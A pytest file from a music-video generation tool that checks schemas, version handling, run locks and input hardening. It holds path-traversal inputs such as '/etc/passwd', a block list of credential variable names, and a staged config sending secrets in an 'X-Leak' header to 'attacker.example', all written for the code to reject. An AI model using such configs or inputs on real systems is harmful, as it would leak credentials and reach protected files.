# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at https://mozilla.org/MPL/2.0/.

"""Committed schemas, examples and templates must stay in step with the code."""

import json
import os
import socket
from importlib import resources
from pathlib import Path

import pytest

from mvdirector.config import ProjectConfig, load_config
from mvdirector.errors import ConfigError, ProjectLocked
from mvdirector.generation.runner import load_templates
from mvdirector.models import MANIFEST_SCHEMA_VERSION, Analysis, AssetKind, Manifest
from mvdirector.planning.planner import build_manifest
from mvdirector.project import Project

ROOT = Path(__file__).parent.parent


@pytest.mark.parametrize(("name", "model"), [("manifest", Manifest), ("analysis", Analysis)])
def test_committed_schema_matches_model(name, model):
    committed = json.loads((ROOT / "schemas" / f"{name}.schema.json").read_text())
    assert committed == model.model_json_schema(), "Run `mvd schema schemas` and commit the result."


@pytest.mark.parametrize(("name", "model"), [("manifest", Manifest), ("analysis", Analysis)])
def test_example_validates(name, model):
    model.model_validate_json((ROOT / "examples" / f"{name}.example.json").read_text())


def test_template_config_matches_defaults(monkeypatch):
    monkeypatch.delenv("COMFY_URL", raising=False)
    monkeypatch.delenv("MVD_LLM_URL", raising=False)
    with resources.as_file(resources.files("mvdirector") / "templates" / "project.yaml") as path:
        template = load_config(path)
    expected = ProjectConfig(title="My Song")
    expected.comfy.base_url = "http://127.0.0.1:8188"
    assert template == expected


@pytest.mark.parametrize("bad_version", [0, -1, MANIFEST_SCHEMA_VERSION + 1, 99])
def test_manifest_rejects_unsupported_schema_version(project: Project, bad_version: int) -> None:
    raw = json.loads((ROOT / "examples" / "manifest.example.json").read_text())
    raw["schema_version"] = bad_version
    project.manifest_path.write_text(json.dumps(raw))
    with pytest.raises(ConfigError, match="schema_version"):
        project.load_manifest()


@pytest.mark.parametrize("bad_version", [0, 2, 99])
def test_analysis_rejects_unsupported_schema_version(project: Project, bad_version: int) -> None:
    raw = json.loads((ROOT / "examples" / "analysis.example.json").read_text())
    raw["schema_version"] = bad_version
    project.analysis_path.write_text(json.dumps(raw))
    with pytest.raises(ConfigError, match="schema_version"):
        project.load_analysis()


def test_multicharacter_manifest_persists_without_duplicate_primary_copy(project: Project) -> None:
    from mvdirector.models import Character

    manifest = Manifest(
        title="Duet",
        duration=10.0,
        fps=24,
        characters={
            "elias": Character(name="Elias", appearance="Dark curly hair."),
            "odalie": Character(name="Odalie", appearance="Blonde waves."),
        },
    )
    assert manifest.character is manifest.characters["elias"]
    project.save_manifest(manifest)
    raw = json.loads(project.manifest_path.read_text())
    assert "character" not in raw and set(raw["characters"]) == {"elias", "odalie"}
    reloaded = project.load_manifest()
    assert reloaded.character is reloaded.characters["elias"]
    assert reloaded.character.appearance == "Dark curly hair."


@pytest.mark.parametrize("escape", ["/etc/passwd", "../../outside.png", "../secret/key"])
def test_project_path_and_rel_reject_escapes(project: Project, escape: str) -> None:
    with pytest.raises(ConfigError, match="project folder"):
        project.path(escape)
    with pytest.raises(ConfigError, match="project folder"):
        project.rel(Path("/etc/passwd"))


def test_interpolated_ids_and_workflow_paths_reject_escapes(
    project: Project, analysis: Analysis
) -> None:
    manifest = build_manifest(project.config, analysis, "lyrics", "style", llm=None)
    shot = manifest.shots[0]
    shot.id = "../../outside"
    with pytest.raises(ConfigError, match="shot id"):
        project.asset_path(shot, AssetKind.STILL, 1)
    with pytest.raises(ConfigError, match="shot id"):
        project.audio_slice_path("../../outside")
    project.config.comfy.workflows["t2i"] = "../../outside.json"
    with pytest.raises(ConfigError, match="project folder"):
        load_templates(project, ["t2i"])


def test_stale_lock_from_dead_local_pid_is_cleared_automatically(project: Project) -> None:
    project.state.lock_path.write_text(
        json.dumps({"pid": 999_999_999, "host": socket.gethostname(), "started": "now"})
    )
    assert not project.is_locked
    assert not project.state.lock_path.exists()
    with project.run_lock():
        assert project.state.lock_path.exists()
        with pytest.raises(ProjectLocked), project.run_lock():
            pass
    assert not project.state.lock_path.exists()


def test_lock_from_other_host_or_live_pid_is_preserved(project: Project) -> None:
    project.state.lock_path.write_text(
        json.dumps({"pid": 999_999_999, "host": "another-machine.local", "started": "now"})
    )
    assert project.is_locked
    with pytest.raises(ProjectLocked), project.run_lock():
        pass
    project.state.lock_path.write_text(
        json.dumps({"pid": os.getpid(), "host": socket.gethostname(), "started": "now"})
    )
    assert project.is_locked
    project.state.lock_path.unlink()


def test_edit_manifest_locks_loads_and_saves(project: Project, analysis: Analysis) -> None:
    manifest = build_manifest(project.config, analysis, "lyrics", "style", llm=None)
    project.save_manifest(manifest)
    with project.edit_manifest() as edited:
        assert project.state.lock_path.exists()
        edited.title = "Updated Title"
    assert not project.state.lock_path.exists()
    assert project.load_manifest().title == "Updated Title"


@pytest.mark.parametrize("bad_id", ["../escape", "bad/id", "id'quote", "-flag", ""])
def test_models_reject_unsafe_identifiers(bad_id: str) -> None:
    from pydantic import ValidationError

    from mvdirector.models import Character, Shot, WardrobeState

    with pytest.raises(ValidationError):
        Shot(id=bad_id, index=0, start=0.0, end=1.0, duration=1.0, frames=25)
    with pytest.raises(ValidationError):
        Shot(id="s001", index=0, start=0.0, end=1.0, duration=1.0, frames=25, wardrobe=bad_id)
    with pytest.raises(ValidationError):
        WardrobeState(id=bad_id, description="coat")
    with pytest.raises(ValidationError):
        Character(description="singer", references={bad_id: "assets/ref.png"})


def test_workflow_bindings_reject_escaping_graph_path(tmp_path: Path) -> None:
    from mvdirector.comfy.workflow import WorkflowTemplate
    from mvdirector.errors import WorkflowBindingError

    bindings = {
        "workflow": "../../outside.json",
        "inputs": {},
        "output": {"node": "9"},
    }
    path = tmp_path / "still.bindings.json"
    path.write_text(json.dumps(bindings))
    with pytest.raises(WorkflowBindingError, match="escapes"):
        WorkflowTemplate.load("still", path, root=tmp_path)


def test_expand_env_and_api_key_env_restrict_variable_names(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from pydantic import ValidationError

    from mvdirector.config import LLMConfig, expand_env

    monkeypatch.setenv("MVD_CUSTOM", "ok")
    monkeypatch.setenv("COMFY_API_KEY", "comfy-secret")
    monkeypatch.setenv("RUNPOD_TOKEN", "rp-secret")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "top-secret")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")
    monkeypatch.setenv("DATABASE_URL", "postgres://user:pass@db/app")
    monkeypatch.setenv("STRIPE_API_KEY", "sk-stripe-secret")
    monkeypatch.setenv("SLACK_TOKEN", "xoxb-secret")
    monkeypatch.setenv("HOME", "/Users/test")

    assert expand_env("${MVD_CUSTOM}") == "ok"
    assert expand_env("${COMFY_API_KEY}") == "comfy-secret"
    assert expand_env("${RUNPOD_TOKEN}") == "rp-secret"
    for blocked in (
        "AWS_SECRET_ACCESS_KEY",
        "ANTHROPIC_API_KEY",
        "DATABASE_URL",
        "STRIPE_API_KEY",
        "SLACK_TOKEN",
        "HOME",
    ):
        with pytest.raises(ConfigError, match="not allowed"):
            expand_env(f"${{{blocked}}}")

    assert LLMConfig(api_key_env="MVD_LLM_KEY").api_key_env == "MVD_LLM_KEY"
    assert LLMConfig(api_key_env="OPENAI_API_KEY").api_key_env == "OPENAI_API_KEY"
    # Arbitrary *_KEY / *_TOKEN names would be sent to whatever llm.base_url the YAML names.
    for leaked in ("WORK_KEY", "STRIPE_API_KEY", "SLACK_TOKEN", "HF_TOKEN"):
        with pytest.raises(ValidationError, match="not allowed"):
            LLMConfig(api_key_env=leaked)
    with pytest.raises(ValidationError, match="not allowed"):
        LLMConfig(api_key_env="AWS_SECRET_ACCESS_KEY")
    with pytest.raises(ValidationError, match="not allowed"):
        LLMConfig(api_key_env="GITHUB_TOKEN")

    monkeypatch.setenv("MVD_ALLOWED_ENV_VARS", "CUSTOM_PROXY_TOKEN,AWS_SECRET_ACCESS_KEY")
    monkeypatch.setenv("CUSTOM_PROXY_TOKEN", "proxy-ok")
    assert expand_env("${CUSTOM_PROXY_TOKEN}") == "proxy-ok"
    # Hard-blocked prefixes cannot be opted back in even via MVD_ALLOWED_ENV_VARS.
    with pytest.raises(ConfigError, match="not allowed"):
        expand_env("${AWS_SECRET_ACCESS_KEY}")


@pytest.mark.parametrize(
    "secret_var",
    ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "DATABASE_URL", "STRIPE_API_KEY", "SLACK_TOKEN"],
)
def test_load_config_blocks_credential_exfiltration_into_comfy_headers(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, secret_var: str
) -> None:
    monkeypatch.setenv(secret_var, "sensitive-value")
    cfg_path = tmp_path / "project.yaml"
    cfg_path.write_text(
        "comfy:\n"
        "  base_url: https://attacker.example\n"
        "  headers:\n"
        f'    X-Leak: "${{{secret_var}}}"\n',
        encoding="utf-8",
    )
    with pytest.raises(ConfigError, match="not allowed"):
        load_config(cfg_path)


def test_omitted_connection_fields_still_expand_their_defaults(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    cfg_path = tmp_path / "project.yaml"
    cfg_path.write_text("title: Song\n", encoding="utf-8")
    monkeypatch.delenv("COMFY_URL", raising=False)
    assert load_config(cfg_path).comfy.base_url == "http://127.0.0.1:8188"
    assert ProjectConfig().comfy.base_url == "http://127.0.0.1:8188"
    monkeypatch.setenv("COMFY_URL", "http://gpu-box:8188")
    assert load_config(cfg_path).comfy.base_url == "http://gpu-box:8188"
    cfg_path.write_text(
        "llm:\n  base_url: ${MVD_LLM_URL:-http://localhost:11434}\n", encoding="utf-8"
    )
    monkeypatch.setenv("MVD_LLM_URL", "http://llm-box:11434")
    assert load_config(cfg_path).llm.base_url == "http://llm-box:11434"


def test_comfy_subfolder_is_portable_across_host_paths(tmp_path: Path) -> None:
    import shutil

    from mvdirector.config import CONFIG_FILENAME

    # In-memory projects without config files hash portable identity, not absolute path.
    mem_a = Project(tmp_path / "host1" / "duet", ProjectConfig(title="Duet", seed=7))
    mem_b = Project(tmp_path / "host2" / "duet", ProjectConfig(title="Duet", seed=7))
    assert mem_a.comfy_subfolder == mem_b.comfy_subfolder

    # Persisted projects write a portable .mvd_id so moving machines preserves the subfolder
    # while distinct projects with identical folder names stay isolated.
    proj_1 = tmp_path / "machine_a" / "song"
    proj_1.mkdir(parents=True)
    (proj_1 / CONFIG_FILENAME).write_text("title: Song\n", encoding="utf-8")
    p1 = Project.open(proj_1)
    sub_1 = p1.comfy_subfolder

    moved = tmp_path / "machine_b" / "song"
    moved.parent.mkdir(parents=True)
    shutil.copytree(proj_1, moved)
    assert Project.open(moved).comfy_subfolder == sub_1

    proj_2 = tmp_path / "machine_c" / "song"
    proj_2.mkdir(parents=True)
    (proj_2 / CONFIG_FILENAME).write_text("title: Song\n", encoding="utf-8")
    assert Project.open(proj_2).comfy_subfolder != sub_1
